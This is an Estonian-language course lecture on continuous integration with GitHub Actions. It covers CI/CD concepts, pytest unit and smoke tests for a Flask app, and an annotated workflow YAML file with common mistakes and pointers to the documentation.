---
tags:
  - CI
  - GitHubActions
  - Testimine
  - Automatiseerimine
---

# Loeng: automaatne testimine ja konveier (CI)

**Eeldus:** N2 pull request'id ja haru `main` kaitsmine, N5 Flaski rakendus ja `Dockerfile`. Teste ei ole sa varem kirjutanud. Seda õpid täna.

N5-s pakkisid Flaski rakenduse konteinerisse ja N6-s panid selle Compose'iga koos andmebaasiga tööle. Iga kord kontrollisid tulemust ise: käivitasid `curl`-i ja vaatasid vastust. Täna antakse see kontroll üle masinale. GitHub hakkab iga muudatuse järel ise teste käivitama ja ütleb, kas kood on korras.

!!! abstract "Õpiväljundid"
    Pärast loengut ja praktikumi oskad:

    - selgitada, mis on CI ja millist probleemi see lahendab
    - eristada CI-d, pidevat tarnet ja pidevat paigaldust
    - kirjutada pytest'iga automaattesti ja eristada ühiktesti suitsutestist
    - lugeda GitHub Actionsi töövoogu: sündmus, töö, runner, samm, `needs`
    - koostada töövoo YAML-faili ja leida selles tüüpilised vead
    - leida GitHub Actionsi dokumentatsioonist võtme või action'i kirjeldus
    - leida samad osad GitLab CI ja Jenkinsi konveierist
    - lugeda väljumiskoodi järgi, kas viga on koodis või töövoos

---

## 1. „Töötab minu masinas“ meeskonnas

Kui projektiga tegeleb üks inimene, kontrollib ta oma tööd ise ja teab, mis tema arvutis on. Kui sama rakendust arendab viis inimest, ei tea keegi enam täpselt, mida teised muutsid ja mida nad enne `git push`-i kontrollisid.

Kaks tüüpilist viga näevad välja nii.

Esimene viga: arendaja muudab üht osa rakendusest ja käivitab ainult selle osa testid. Tema muudatus rikub teise osa, aga seda ta ei näe, sest neid teste ta ei käivitanud. Kood jõuab harusse `main`. Järgmine arendaja tõmbab muudatused ja tema arvutis läheb midagi katki. Tema ei ole midagi valesti teinud. Viga tuli eelmisest commit'ist.

Teine viga: arendaja paigaldab oma arvutisse teegi ja unustab selle kirjutada faili `requirements.txt`. Tema arvutis töötab kõik. Serveris, kolleegi arvutis ja Docker image'is see teek puudub ja rakendus ei käivitu. Arendaja arvutisse on aastate jooksul kogunenud palju programme, mille paigaldamist keegi enam ei mäleta.

**CI** lahendab mõlemad probleemid. Iga push käivitab automaatselt **kõik** testid ja teeb seda värskes tühjas masinas. Kui mõni test kukub, ei saa koodi harusse `main` liita. Keegi ei pea meeles pidama, et teste tuleb käivitada, ega mäletama, mis tema arvutisse paigaldatud on.

<figure markdown="span">
  ![Arendaja teeb git push. Värskes virtuaalmasinas (runneris) käivituvad järjest checkout, Pythoni paigaldus ja testid. Roheline tulemus lubab muudatuse liita, punane keelab selle ja tagasiside jõuab mõne minutiga arendajani](../images/n07_ci_tsykkel.svg)
  <figcaption>Joonis 7.1. Iga push käivitab konveieri värskes masinas; punane test blokeerib liitmise ja annab arendajale kohe teada, mis läks katki (Talvik, 2026).</figcaption>
</figure>

---

## 2. Mis on CI

**CI** (continuous integration, pidev integratsioon) on töövõte, kus arendajad saadavad oma koodi ühisesse repositooriumi tihti ja väikeste osadena. Iga muudatuse järel ehitatakse rakendus ja käivitatakse kontrollid automaatselt. GitHubi lehel [Continuous integration](https://docs.github.com/en/actions/get-started/continuous-integration) on CI kirjeldatud just nii ja see osa järgib seda lehte.

Miks peavad muudatused olema väikesed? Mida väiksem on muudatus, seda kiiremini viga leitakse ja seda vähem koodi tuleb vea otsimisel läbi vaadata. Kui kõik liidavad oma tööd tihti, on ka liitmiskonfliktid väiksemad. Varem töötas igaüks nädalaid oma harus ja kõik muudatused pandi kokku ühel päeval. Red Hat nimetab seda *merge day* ([Red Hat: CI/CD](https://www.redhat.com/en/topics/devops/what-is-ci-cd)). Konfliktid ja vead tulid siis välja hilja, kui nende parandamine oli kallis.

CI kontrollid võivad olla eri tüüpi:

- **linterid** kontrollivad koodi stiili ja levinud vigu;
- **turvakontrollid** otsivad näiteks koodi sattunud paroole ja teadaolevate turvaaukudega teeke;
- **testide katvus** näitab, kui suurt osa koodist testid läbivad;
- **funktsionaalsed testid** kontrollivad, kas rakendus teeb seda, mida peab. Täna kirjutad selliseid teste pytest'iga.

Testide käivitamiseks on vaja masinat. Arendaja võib testid käivitada oma arvutis enne push'i. CI puhul teeb seda server, mis jälgib repositooriumi ja käivitab testid iga muudatuse järel. GitHub Actionsis on selleks runner. GitHub näitab tulemust pull request'i lehel. Kui kõik kontrollid on rohelised, võib kolleeg muudatuse üle vaadata ja liita.

CI-l on kaks poolt ([AWS: continuous integration](https://aws.amazon.com/devops/continuous-integration/)). Üks pool on automaatika ehk teenus, mis ehitab ja testib. Teine pool on meeskonna harjumus liita muudatusi tihti ja parandada punane tulemus kohe.

### CI reeglid

Need reeglid kirjutas [Martin Fowler](https://martinfowler.com/articles/continuousIntegration.html) üles juba 2000. aastal ja [IBM](https://www.ibm.com/think/topics/continuous-integration) kordab neid ka praegu. Reeglid kehtivad sõltumata sellest, mis tööriista kasutatakse.

| Reegel | Mida see tähendab |
|---|---|
| Üks ühine repositoorium | Kõik, mida on vaja ehitamiseks ja testimiseks, on Gitis. Ühegi inimese arvutis ei ole midagi, millest ehitus sõltub. |
| Liida tihti | Tee iga päev väike pull request. Suur muudatus kord kuus on raskesti kontrollitav. |
| Iga muudatus ehitatakse ja testitakse automaatselt | Keegi ei pea meeles pidama, et teste tuleb käivitada. |
| Katkine ehitus parandatakse kohe | Kui haru `main` on punane, on selle parandamine meeskonna kõige tähtsam töö. Seni uusi muudatusi peale ei lisata. |
| Kiire tagasiside | Konveier, mis kestab tund aega, jäetakse vahele. Tulemus peab tulema minutitega. |
| Testi tootmise sarnases keskkonnas | Testid ei käivitu otse tootmises ega arendaja arvutis. |

*Tabel 7.1. CI on harjumus. GitHub Actions, GitLab CI ja Jenkins on tööriistad, mis seda harjumust automatiseerivad.*

### Kas see on CI?

Väikeses e-poes töötavad arendaja Kertu, süsteemiadministraator Rasmus ja praktikant Marko. Neil on kasutada GitHub Actions. Tabelist näed, et tööriist üksi ei tee veel CI-d.

| Mis meeskonnas toimub | CI? | Miks |
|---|---|---|
| Marko muudab ostukorvi koodi ja teeb pull request'i. GitHub Actions käivitab 2 minutiga testid ja üks test kukub. Liitmise nupp on hall. Marko parandab vea, testid on rohelised ja muudatus liidetakse. | **Jah** | Iga muudatus testitakse automaatselt. Punane test peatab liitmise ja viga parandatakse kohe. |
| Rasmus muudab faili `nginx.conf`. CI käivitab käsu `nginx -t` ja leiab puuduva semikooloni enne, kui fail serverisse jõuab. | **Jah** | Süsteemiadministraatori konfiguratsioonifail on samuti kood. Viga leiti enne tootmist. |
| Töövoog on olemas, aga see käivitatakse käsitsi nupuga enne suurt väljalaset, kord kuus. | **Ei** | Testid käivituvad harva ja ainult siis, kui keegi selle peale tuleb. |
| Haru `main` on punane juba kaks nädalat. Kõik ütlevad, et see üks test on alati punane, ja liidavad muudatusi edasi. | **Ei** | Tööriist on olemas, harjumus puudub. Kui punast tulemust keegi ei vaata, ei kaitse CI millegi eest. |
| Kertu töötab uue makseviisi kallal kuu aega oma harus ja liidab siis korraga 3000 rida. CI on roheline. | **Ei** | Muudatusi liidetakse harva ja suurelt. Konfliktid ja vead tulevad välja korraga, kui nende parandamine on kõige kallim. |
| Töövoos on üks samm: `run: echo "testid OK"`. Tulemus on alati roheline. | **Ei** | Roheline tulemus ei tähenda midagi, kui miski ei saa punaseks minna. |
| Marko paigaldas oma arvutisse teegi ja testid läbivad tema arvutis. Ta teeb push'i otse harusse `main` ilma pull request'ita ja CI ei käivitu. | **Ei** | Kontroll toimus ainult tema arvutis. See ei ole kontroll, mida meeskond saab usaldada. |

*Tabel 7.2. CI on see, mis juhtub iga muudatusega. Vahekaardil Actions olev töövoog üksi ei ole veel CI.*

??? question "Mõtle"
    Vali tabelist üks rida, kus vastus on „Ei“. Mis peaks muutuma, et vastus oleks „Jah“: tööriist, reegel või meeskonna harjumus?

### CI, pidev tarne ja pidev paigaldus

Lühend CI/CD tähistab kolme astet. Need erinevad selle poolest, kui kaugele automaatika jõuab ilma inimese otsuseta ([GitLab: CI/CD](https://about.gitlab.com/topics/ci-cd/)).

<figure markdown="span">
  ![Neli kasti reas: git push, ehitus ja testid, valmis pakett registris, inimene vajutab nuppu, tootmine. Kriipsjoon läheb registrist otse tootmisse automaatselt. All kolm riba: CI hõlmab push'ist testideni, pidev tarne registrini, pidev paigaldus tootmiseni](../images/n07_ci_cd_astmed.svg)
  <figcaption>Joonis 7.2. CI lõpeb testidega. Delivery valmistab väljalaske ette ja inimene vajutab nuppu. Deployment laseb ka ise välja (Talvik, 2026).</figcaption>
</figure>

| Aste | Mis on automaatne | Kes otsustab tootmisse viimise |
|---|---|---|
| **CI** (continuous integration) | ehitus ja testid | keegi, sest tootmiseni ei jõuta |
| **Pidev tarne** (continuous delivery) | lisaks pakkimine, väljalase on igal hetkel valmis | inimene ühe nupuvajutusega |
| **Pidev paigaldus** (continuous deployment) | lisaks väljalase tootmisse | testid, inimest vahel ei ole |

*Tabel 7.3. Sel nädalal teed CI. N8 lisab pideva tarne: image läheb registrisse.*

Kogu konveieri (commit, ehitus, testid, testkeskkond ja tootmine) näed ühel joonisel ByteByteGo artiklis [CI/CD pipeline explained in simple terms](https://blog.bytebytego.com/p/ep71-cicd-pipeline-explained-in-simple).

Pidev paigaldus on võimalik ainult siis, kui teste usaldatakse täielikult, sest enne tootmist ei vaata muudatust ükski inimene. Seepärast soovitab [GitHub](https://github.com/resources/articles/ci-cd) alustada pidevast tarnest. Pideva paigalduse juurde minnakse alles siis, kui testid on end tõestanud.

### CI süsteemiadministraatorile

CI-st räägitakse tavaliselt arendajate näidetega. Süsteemiadministraatori failid on aga samuti tekstifailid Gitis: playbook'id, skriptid, konfiguratsioonifailid ja `Dockerfile`'id. Ka neid saab enne serverisse jõudmist automaatselt kontrollida. [GitLab](https://about.gitlab.com/topics/ci-cd/) loeb ka infrastruktuuri ettevalmistamise CD osaks.

| Fail | Kontroll CI-s | Mida leiab | Kursusel |
|---|---|---|---|
| Ansible playbook | `ansible-playbook --syntax-check`, [`ansible-lint`](https://docs.ansible.com/projects/lint/) | taandevead, `command` mooduli kasutamise sobiva mooduli asemel | N3–N4 |
| Idempotentsus | playbook käivitatakse konteineris kaks korda, teisel korral peab olema `changed=0` | playbook'i, mis muudab iga kord midagi | N3 |
| Bashi skript | [`shellcheck`](https://www.shellcheck.net/) | jutumärkideta muutujad, `cd` ilma veakontrollita | N2 `monitor.sh` |
| Konfiguratsioonifail | `nginx -t` konteineris, `yamllint` | vigase konfiguratsiooni enne serverisse jõudmist | N3, N4 praktikumi lisaosa |
| Saladused | [`gitleaks`](https://github.com/gitleaks/gitleaks) | commit'i, kus on parool või webhook'i aadress | N2 `.env`, N4 Vault |
| Dockerfile | [`hadolint`](https://github.com/hadolint/hadolint) | tag'i `latest`, käivitamise root-kasutajana | N5 |

*Tabel 7.4. Sama põhimõte süsteemiadministraatori failidega.*

<figure markdown="span">
  ![Vasakul süsteemiadministraatori failid Gitis (site.yml, monitor.sh, nginx.conf, Dockerfile, kogu repositoorium), keskel iga faili kontroll CI-s (ansible-lint, idempotentsus, shellcheck, nginx -t, hadolint, gitleaks), paremal kaks tulemust: kõik on roheline ja playbook läheb 20 serverisse, või üks on punane ja liitmine on blokeeritud](../images/n07_sysadmin_ci.svg)
  <figcaption>Joonis 7.3. Sysadmini konveier: iga fail läbib oma kontrolli enne, kui ükski server seda näeb (Talvik, 2026).</figcaption>
</figure>

Kui playbook'is on vale taane ja see käivitatakse kohe 20 serveris, võivad pooled serverid jääda poolikult seadistatuks. CI leiab sellise vea 30 sekundiga enne, kui playbook ühtegi serverit muudab.

---

## 3. Mis on automaattest

Seni kontrollisid oma tööd käsitsi. Käivitasid `curl localhost:5000`, vaatasid vastust ja otsustasid ise, kas see on õige. **Automaattest** on sama kontroll, mis on kirjutatud koodina. Koodina kirjutatud kontrolli saab korrata mitu tuhat korda ja see ei unu kunagi.

Pythonis on kõige levinum testiraamistik [**pytest**](https://docs.pytest.org/en/stable/getting-started.html). Test on tavaline Pythoni funktsioon, mille nimi algab sõnaga `test_`. Funktsiooni sees on üks või mitu `assert`-lauset:

```python
from app import app


def test_avaleht_vastab():
    vastus = app.test_client().get("/")
    assert vastus.status_code == 200
    assert "Tere" in vastus.get_data(as_text=True)
```

Sõna `assert` tähendab, et järgnev tingimus peab olema tõene. Kui tingimus on tõene, liigub pytest edasi. Kui see on väär, test kukub ja pytest näitab, mida oodati ja mis tegelikult tuli:

```text
E       AssertionError: assert 'Tervist' in 'Tere konteinerist!'
```

`app.test_client()` on Flaski sisseehitatud testklient ([Flask: testimine](https://flask.palletsprojects.com/en/stable/testing/)). See saadab rakendusele päringu Pythoni sees, ilma et serverit peaks käivitama või porti avama. Seepärast kestab test millisekundeid ning ei vaja Dockerit ega võrku.

### Ühiktest ja suitsutest

Testid jagunevad selle järgi, kui suurt osa rakendusest need kontrollivad. Selle kursuse konveieris on kaks taset.

| | Ühiktest | Suitsutest (*smoke test*) |
|---|---|---|
| Mida kontrollib | üht funktsiooni või aadressi koodi tasemel | kas kogu rakendus käivitub ja vastab |
| Kuidas | `pytest` ja `test_client()` | `docker build`, `docker run` ja `curl` |
| Kestus | millisekundid | kümned sekundid |
| Mida leiab | loogikavead | pakkimise ja käivitamise vead, näiteks N5 `127.0.0.1` ja `0.0.0.0` erinevus |

*Tabel 7.5. Ühiktest näitab, kas kood on õige. Suitsutest näitab, kas sama kood töötab ka konteineris.*

Suitsutesti nimi tuleb elektroonikast. Seade lülitati sisse ja vaadati, kas sellest tuleb suitsu. Kui suitsu tuli, polnud mõtet edasi testida.

Ühest testitasemest ei piisa. N5-s nägid, et Flaski kood võis olla korras, aga konteinerist rakendus ei vastanud. Ühiktest seda viga ei leia, suitsutest leiab.

---

## 4. GitHub Actionsi ülesehitus

**GitHub Actions** on GitHubi sisseehitatud teenus, mis käivitab repositooriumis kirjeldatud tegevusi automaatselt. Selles osas on GitHub Actionsi viis põhimõistet samas järjekorras nagu GitHubi ametlikul lehel [Understanding GitHub Actions](https://docs.github.com/en/actions/get-started/understand-github-actions): töövoog, sündmus, töö, action ja runner.

Lühike töövoog näeb välja nii:

```yaml
name: CI

on:
  push:
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: echo "siia tulevad testid"
```

<figure markdown="span">
  ![Vasakul ci.yml värviliste ridadega, paremal selgitused: on on sündmus ehk millal töövoog käivitub, test on töö ehk sammude rühm, runs-on on runner ehk masin, uses-read on valmis action'id ja run-read tavalised Bashi käsud. All ahel: sündmus, töövoog, töö, runner, samm](../images/n07_actions_anatoomia.svg)
  <figcaption>Joonis 7.4. GitHub Actionsi osad ja read, mis neid failis tähistavad (Talvik, 2026, D. Mosyani ülevaate põhjal).</figcaption>
</figure>

### Töövoog

**Töövoog** (workflow) on YAML-fail kaustas `.github/workflows/`. Kui selline fail on repositooriumis, loeb GitHub seda ja käivitab selles kirjeldatud tööd. Töövoog käivitub sündmusest repositooriumis, käsitsi nupuga või ajakava järgi.

Repositooriumis võib olla mitu töövoogu. Näiteks üks testib pull request'e, teine paigaldab väljalaske ja kolmas lisab igale uuele issue'le sildi. GitHub Actions ei ole seega ainult CI/CD tööriist, sellega saab automatiseerida ka muid repositooriumi tegevusi.

Iga kord, kui töövoog käivitub, tekib repositooriumi vahekaardile **Actions** uus **käivitus** (run). Käivituse lehel näed iga töö ja iga sammu tulemust ning logi.

### Sündmus

**Sündmus** (event, trigger, võti `on:`) on tegevus repositooriumis, mis töövoo käivitab. Sündmus `push` käivitab töövoo iga push'i järel. Sündmus `pull_request` käivitab selle, kui pull request avatakse või seda uuendatakse. Sündmus võib olla ka näiteks issue avamine. Sündmust saab piirata harudega, näiteks `branches: [main]`. Kõik sündmused on lehel [Events that trigger workflows](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows).

### Töö ja samm

**Töö** (job, võti `jobs:`) on sammude rühm, mis tehakse samas runneris. Näites on üks töö nimega `test`.

**Samm** (step, võti `steps:`) on üks tegevus töö sees. Sammud tehakse järjest ülevalt alla. Kuna sammud on samas masinas, saavad need kasutada sama kausta ja samu faile: üks samm ehitab rakenduse ja järgmine testib sama tulemust. Samm on kahte tüüpi:

- `run:` käivitab tavalise Bashi käsu, näiteks `pytest` või `docker build`.
- `uses:` käivitab action'i (vaata allpool).

Kui mõni samm kukub, jäävad järgmised sammud käivitamata ja kogu töö on punane.

Tööd käivituvad vaikimisi **korraga ja eraldi masinates**. Kahe töö vahel faile ei jagata. Kui üks töö peab ootama teise lõppu, pannakse need järjekorda võtmega `needs` (allpool). Sama tööd saab käivitada ka mitu korda eri versioonidega, näiteks kolme Pythoni versiooniga korraga. Seda nimetatakse maatriksiks (`strategy: matrix`) ja sellega saad tutvuda praktikumi lisaülesandes.

### Action

**Action** on korduvkasutatav programm, mis teeb ühe levinud tegevuse: tõmbab repositooriumi koodi, paigaldab tööriista või logib sisse pilveteenusesse. Action'i kirjutad ise või võtad valmis kujul [GitHub Marketplace'ist](https://github.com/marketplace?type=actions). Sammus kasutatakse seda võtmega `uses:`. Näiteks [`actions/checkout`](https://github.com/actions/checkout) laadib repositooriumi failid runnerisse. Märgi `@` järel on action'i versioon.

### Runner

**Runner** on server, mis täidab ühte tööd korraga. Rida `runs-on: ubuntu-latest` ütleb, et töö jaoks antakse GitHubi Ubuntu virtuaalmasin. GitHub pakub ka Windowsi ja macOS-i runnereid. Iga töö saab värske virtuaalmasina ja selles ei ole midagi eelmisest käivitusest. Runneri võib paigaldada ka oma serverisse (*self-hosted runner*), aga sellel kursusel kasutame GitHubi runnereid.

### Kuidas töövoog käivitub

GitHubi lehel [Workflows](https://docs.github.com/en/actions/concepts/workflows-and-actions/workflows) on käivitumine kirjeldatud kolme sammuna:

1. Repositooriumis toimub sündmus, näiteks push, pull request või issue avamine. Igal sündmusel on commit (selle räsi ehk SHA) ja haru või tag (ref).
2. GitHub otsib **selle commit'i** kaustast `.github/workflows/` töövoo faile.
3. Käivitub iga töövoog, mille võti `on:` vastab sündmusele.

Sellest järeldub, et käivitus kasutab töövoo faili sellest commit'ist, mis sündmuse tekitas. Kui muudad töövoogu harus `n07-ci`, kehtib muudatus selle haru push'il. Harus `main` töötab vana töövoog seni, kuni muudatus sinna liidetakse. Runneris on sündmuse commit ja haru muutujates `GITHUB_SHA` ja `GITHUB_REF`.

Töövoos peavad olema vähemalt üks sündmus ja vähemalt üks töö. Igas töös on sammud ja iga samm on kas Bashi skript (`run`) või action (`uses`). Peale repositooriumi sündmuste saab töövoo käivitada ka ajakava järgi (`schedule`), käsitsi nupuga vahekaardil **Actions** (`workflow_dispatch`) või väljastpoolt GitHubi API kaudu (`repository_dispatch`).

Kõik töövoo võtmesõnad on kirjas [töövoo süntaksi juhendis](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax). Sama teema on piltidega lahti seletatud ka D. Mosyani artiklis [Understanding the basics of GitHub Actions](https://medium.com/@dmosyan/understanding-the-basics-of-github-actions-7787993d300c).

### Tööde järjekord: `needs`

Kui üks töö peab ootama teise töö lõppu, kirjutatakse see võtmega `needs:`:

```yaml
jobs:
  test:
    # ...
  konteiner:
    needs: test
    # ...
```

Töö `konteiner` alustab alles siis, kui töö `test` on lõppenud roheliselt. Kui `test` kukub, jääb `konteiner` käivitamata ja on käivituse lehel hall (*skipped*). Katkise koodiga konteinerit ei ole mõtet ehitada. N8-s lisatakse samasse järjekorda kolmas töö, mis saadab image'i registrisse.

---

## 5. Töövoo fail rida realt

Eelmises osas nägid töövoo osi. Selles osas on terve töövoo fail. See on peaaegu sama fail, mille koostad praktikumis, ainult mõne lisavõtmega, mida on hea tunda. Koodi kõrval on numbrid. Klõpsa numbril, et näha, mida see rida teeb ja mis juhtub, kui see puudub.

### YAML-i reeglid

Töövoo fail on kirjutatud YAML-is. N3-s kirjutasid samas keeles Ansible'i playbook'e ja reeglid on samad:

- **Taane näitab, mis millegi sisse kuulub.** Taandes kasutatakse ainult tühikuid, tavaliselt kaks tühikut taseme kohta. Tabulaatoriga taane annab vea.
- **Koolonile järgneb tühik.** Rida `runs-on: ubuntu-latest` on õige, `runs-on:ubuntu-latest` on vale.
- **Kriips `-` rea alguses tähendab loendi elementi.** Iga samm võtme `steps:` all algab kriipsuga. Kõik read, mis kuuluvad samasse sammu, on kriipsu järel oleva teksti joonel.
- **Märk `#` alustab kommentaari.** GitHub ei loe seda, mis on pärast märki `#`.

### Terve töövoog

```yaml
name: CI # (1)!

on: # (2)!
  push:
  pull_request:
    branches: [main] # (3)!

jobs: # (4)!
  test: # (5)!
    runs-on: ubuntu-latest # (6)!
    steps: # (7)!
      - name: Too kood runnerisse # (8)!
        uses: actions/checkout@v7 # (9)!
      - uses: actions/setup-python@v7
        with: # (10)!
          python-version: "3.12"
      - run: pip install -r flask/requirements.txt pytest # (11)!
      - run: pytest flask -v

  konteiner:
    needs: test # (12)!
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - name: Ehita image ja käivita konteiner
        run: | # (13)!
          docker build -t flask-app ./flask
          docker run -d -p 5000:5000 --name flask1 flask-app
      - run: curl -fsS --retry 10 --retry-all-errors --retry-delay 1 localhost:5000/health
```

1. `name` on töövoo nimi, mida GitHub näitab vahekaardil **Actions**. Kui see puudub, näitab GitHub nime asemel faili teed `.github/workflows/ci.yml`.
2. `on` määrab sündmused, mis töövoo käivitavad. See on faili ülemisel tasemel ilma taandeta. Kui `on` puudub või on taandega mõne teise võtme all, ei käivitu töövoog kunagi ja GitHub näitab faili vigasena.
3. `branches` piirab sündmust harudega. Siin käivitub töövoog pull request'i puhul ainult siis, kui see on tehtud harusse `main`. Kui `branches` puudub, kehtib sündmus kõigis harudes. Praktikumis `branches` ei kasutata.
4. `jobs` all on kõik töövoo tööd. Ilma selleta ei ole töövoos midagi teha ja GitHub näitab viga.
5. Töö nime valid ise. Nimi peab olema töövoo piires ainulaadne ja see on käivituse lehel näha. Selle nime järgi viitavad tööle võti `needs` ja ruleset'i reegel **Require status checks to pass**.
6. `runs-on` määrab runneri ehk masina, kus töö tehakse. `ubuntu-latest` on GitHubi Ubuntu virtuaalmasin. Ilma selleta ei tea GitHub, kus tööd teha, ja töö ei käivitu.
7. `steps` all on töö sammud. Iga samm algab kriipsuga ja sammud tehakse järjest ülevalt alla.
8. `name` sammu juures on sammu nimi logis. Kui see puudub, paneb GitHub nimeks käsu, näiteks `Run pytest flask -v`. Nimi ei ole kohustuslik, aga pikas töös aitab see logist õige samm üles leida.
9. `uses` käivitab valmis action'i. Kujul `omanik/nimi@versioon`, siin GitHubi enda action `checkout` versioon 7. Action'eid ja nende parameetreid leiad [GitHub Marketplace'ist](https://github.com/marketplace?type=actions). Iga action'i lehel on kirjas, mida see teeb ja mis parameetreid `with:` all saab anda.
10. `with` annab action'ile parameetrid. See on võtme `uses` all kahe tühiku võrra suurema taandega. Kui `with` puudub, kasutab action vaikeväärtusi. `setup-python` paigaldaks siis vaikimisi versiooni, mitte versiooni `3.12`.
11. `run` käivitab Bashi käsu runneris. Üks samm on kas `uses` või `run`, mõlemat korraga samas sammus olla ei saa.
12. `needs` paneb tööd järjekorda. Töö `konteiner` alustab alles siis, kui `test` on roheline. Ilma selleta käivituvad mõlemad tööd korraga ja image ehitatakse ka siis, kui testid kukuvad.
13. Märk `|` tähendab mitmerealist teksti. Kõik järgmised read, millel on suurem taane, on üks Bashi skript, mis käivitatakse ühes sammus. Kui mõni käsk kukub, on kogu samm punane.

Saladust, näiteks andmebaasi parooli, ei kirjutata töövoo faili. See salvestatakse repositooriumi seadetes **Settings → Secrets and variables → Actions** ja töövoos loetakse seda kujul `${{ secrets.NIMI }}`. Praktikumis seda vaja ei ole, kodutöös küll:

```yaml
  stack:
    needs: konteiner
    runs-on: ubuntu-latest
    env: # (1)!
      POSTGRES_PASSWORD: ${{ secrets.POSTGRES_PASSWORD }} # (2)!
```

1. `env` annab muutujad kõigile selle töö sammudele. Võti on töö tasemel, sama taandega kui `runs-on`. Kui see puudub, ei ole muutujat sammudes olemas.
2. `${{ secrets.POSTGRES_PASSWORD }}` loeb saladuse GitHubi saladuste hoidlast. GitHub asendab selle väärtuse logis märkidega `***`. Kui sellenimelist saladust ei ole, on muutuja tühi ja viga tuleb alles käsus, mis parooli vajab.

Kõik võtmed ja nende võimalikud väärtused on [töövoo süntaksi juhendis](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax).

### Kõige sagedasemad vead

| Viga | Mida näed | Paranda |
|---|---|---|
| Fail on vales kaustas, näiteks `.github/workflow/` või `github/workflows/` | Vahekaardil **Actions** ei ole ühtegi käivitust | Kausta nimi on täpselt `.github/workflows/` |
| Taandes on tabulaator või vale arv tühikuid | Käivitus on kohe punane ja logi ei ole, GitHub näitab teadet `Invalid workflow file` | Kasuta ainult tühikuid. Kontrolli, et `steps` on samal tasemel kui `runs-on` |
| `on` on taandega `jobs` all või puudub | Töövoog ei käivitu või fail on vigane | `on` on faili ülemisel tasemel nagu `name` ja `jobs` |
| Koolonile ei järgne tühikut | `Invalid workflow file` | Kirjuta `run: pytest`, mitte `run:pytest` |
| Samm algab ilma kriipsuta | `Invalid workflow file` | Iga samm algab `- ` |

*Tabel 7.6. Töövoo faili tüüpilised vead.*

### Mida runner vajab

Runner on tühi masin. Töö `test` iga samm annab sellele ühe asja, mida tal ilma selleta poleks:

| Samm | Mida runner ilma selleta ei tea |
|---|---|
| `checkout` | Kus kood on? Runneris ei ole alguses ühtegi repositooriumi faili. |
| `setup-python` | Millist Pythoni versiooni kasutada? Võti `with:` annab action'ile parameetri, siin versiooni `3.12`. |
| `pip install -r ...` | Milliseid pakette rakendus vajab? Paigaldatakse ainult need, mis on kirjas repositooriumis. Arendaja arvutis olevad paketid ei loe. |
| `pytest` | Kas rakendus töötab? |

*Tabel 7.7. Töövoog kirjeldab kõik, mida runner vajab ja mis on arendaja masinas juba olemas.*

<figure markdown="span">
  ![Vasakul õppija virtuaalmasin, kus on kood, Python, Flask, pytest ja kunagi paigaldatud requests. Keskel ci.yml read, mis toovad igaühe runnerisse. Paremal runner: kood, Python, Flask ja pytest on rohelised, requests on punane, sest seda pole failis requirements.txt](../images/n07_tyhi_masin.svg)
  <figcaption>Joonis 7.5. Iga ci.yml rida vastab ühele asjale, mis sinu VM-is juba on ja runneris mitte. Mida pole repos kirjas, seda runneris ei ole (Talvik, 2026).</figcaption>
</figure>

Praktikumis alustad töövoost, kus need read puuduvad. Iga puuduv rida annab oma vea ja näed seda veateadet ise.

---

## 6. Kust leida vastus: GitHub Actionsi dokumentatsioon

Selles loengus ja praktikumis on ainult väike osa GitHub Actionsi võimalustest. Töökohas tuleb sageli kasutada võtit või action'it, mida sa varem näinud ei ole. Siis ei ole vaja juhendit ega kolleegi, sest vastus on GitHubi dokumentatsioonis. Praktikumis on iga uue võtme juures rida **Leia dokumentatsioonist**, kus otsid vastuse konkreetsele küsimusele ise.

Dokumentatsiooni avaleht on [docs.github.com/en/actions](https://docs.github.com/en/actions). Lühikese ülevaate sellest, mida GitHub Actions teha oskab, annab [GitHub Actionsi tutvustusleht](https://github.com/features/actions). Selle loengu mõisted (töövoog, sündmus, töö, samm, runner, action) on ametlikult kirjeldatud lehel [Understanding GitHub Actions](https://docs.github.com/en/actions/get-started/understand-github-actions).

Dokumentatsioon on jagatud osadeks selle järgi, mida sa otsid:

| Osa | Mida sealt leiad | Näide |
|---|---|---|
| [Get started → Quickstart](https://docs.github.com/en/actions/get-started/quickstart) | esimene töövoog umbes 5 minutiga | fail `github-actions-demo.yml` |
| [Concepts](https://docs.github.com/en/actions/concepts) | mõisted: töövood, runnerid, turvalisus (Secrets, `GITHUB_TOKEN`) | mis on runner |
| [How-tos](https://docs.github.com/en/actions/how-tos) | kuidas midagi teha: töövoo kirjutamine, turvalisus, paigaldamine, käivituste haldamine ja [vigade otsimine (Troubleshoot workflows)](https://docs.github.com/en/actions/how-tos/troubleshoot-workflows) | kuidas lisada saladus |
| [Reference](https://docs.github.com/en/actions/reference) | täpne süntaks: [Workflow syntax](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax), [Events that trigger workflows](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows), [Contexts](https://docs.github.com/en/actions/reference/workflows-and-actions/contexts), [Variables](https://docs.github.com/en/actions/reference/workflows-and-actions/variables), [GitHub-hosted runners](https://docs.github.com/en/actions/reference/runners/github-hosted-runners), [Secrets](https://docs.github.com/en/actions/reference/security/secrets) | mis võtmed on `jobs.<id>` all |
| [GitHub Marketplace → Actions](https://github.com/marketplace?type=actions) | valmis action'id ja nende `with:` parameetrid action'i README-s | `actions/setup-python` |

*Tabel 7.8. GitHub Actionsi dokumentatsiooni osad.*

Marketplace'is on kahte tüüpi tooteid ([Actions vs Apps](https://docs.github.com/en/actions/get-started/actions-vs-apps)). Action'id käivituvad töövoo sammuna runneris ega vaja oma serverit. GitHub Apps töötavad pidevalt sinu enda serveris ja reageerivad repositooriumi sündmustele. Selles kursuses kasutame ainult action'eid.

Osas How-tos on töövoo kirjutamise juhendid jaotises [Write workflows](https://docs.github.com/en/actions/how-tos/write-workflows). Selle all on kolm alajaotist, mis vastavad töövoo kolmele küsimusele: [Choose when workflows run](https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run) (millal töövoog käivitub, näiteks harude ja failide järgi), [Choose where workflows run](https://docs.github.com/en/actions/how-tos/write-workflows/choose-where-workflows-run) (mis runneris töö tehakse) ja [Choose what workflows do](https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do) (mida sammud teevad, näiteks saladuste ja muutujate kasutamine).

